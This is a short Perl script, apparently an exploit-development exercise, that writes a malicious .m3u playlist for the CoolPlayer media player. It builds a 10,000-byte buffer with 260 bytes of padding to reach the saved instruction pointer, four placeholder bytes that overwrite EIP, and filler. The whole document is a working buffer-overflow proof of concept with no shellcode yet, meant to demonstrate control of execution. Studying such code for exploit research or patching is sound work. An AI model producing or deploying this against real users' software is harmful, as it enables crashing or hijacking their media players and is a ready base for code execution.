#!/usr/bin/perl

my $buffsize = 10000; #set consistent buffer size
my $junk = "\x41" x 260; #offset to EIP
my $eip = "\x42" x 4;

my $sploit = $junk.$eip; #build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file

my $file = "coolplayereiptakeover.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
